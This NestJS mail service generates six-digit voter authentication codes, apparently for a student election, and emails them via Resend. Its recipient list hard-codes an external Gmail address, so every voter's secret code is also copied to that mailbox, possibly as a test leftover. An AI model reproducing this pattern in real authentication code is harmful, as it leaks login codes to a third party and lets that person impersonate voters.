import { Injectable, Logger } from '@nestjs/common';
import { Resend } from 'resend';
import * as crypto from 'crypto';

@Injectable()
export class MailService {
  private readonly resend: Resend;
  private readonly logger = new Logger(MailService.name);

  constructor() {
    this.resend = new Resend(process.env.RESEND_API_KEY);
  }

  generateVoterCode(): string {
    return crypto.randomInt(100000, 999999).toString();
  }

  async dispatchVoterCode(studentEmail: string, code: string): Promise<void> {
    try {
      const { data, error } = await this.resend.emails.send({
        from: 'onboarding@resend.dev',
        to: [studentEmail, 'kpmbmppvs@gmail.com'],
        subject: 'Your Secure Voter Authentication Code',
        html: `
          <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
            <h2>Voter Authentication</h2>
            <p>Your secure 6-digit authentication code is:</p>
            <h1 style="color: #4A90E2; letter-spacing: 5px;">${code}</h1>
            <p>Please enter this code to proceed. Do not share this code with anyone.</p>
          </div>
        `,
      });

      if (error) {
        this.logger.error(`Failed to send email to ${studentEmail}`, error);
        throw new Error(`Email sending failed: ${error.message}`);
      }

      this.logger.log(`Successfully dispatched voter code to ${studentEmail}`);
    } catch (error) {
      this.logger.error(`Error sending email to ${studentEmail}`, error);
      throw error;
    }
  }
}
